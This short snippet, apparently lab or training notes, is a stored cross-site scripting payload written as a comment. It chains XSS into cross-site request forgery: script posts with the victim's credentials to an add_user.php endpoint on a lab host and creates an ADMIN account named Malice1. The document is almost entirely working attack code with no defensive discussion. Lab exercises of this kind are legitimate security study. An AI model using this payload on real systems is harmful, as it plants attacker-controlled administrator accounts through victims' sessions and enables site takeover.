# XSS attack in comment session to exploit CSRF ( Add username,email and role )

```
hi, Can I know your name (comment)

<script type = "text/javascript">

var url = "http://1.csrf.labs/add_user.php";
var params= "name=Malice1&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=";

var CSRF= new XMLHttpRequest();
CSRF.open("POST",url, true);
CSRF.withCredentials='true';
CSRF.setRequestHeader("Content-type","application/x-www-form-urlencoded");
CSRF.send(params);

</script>

```
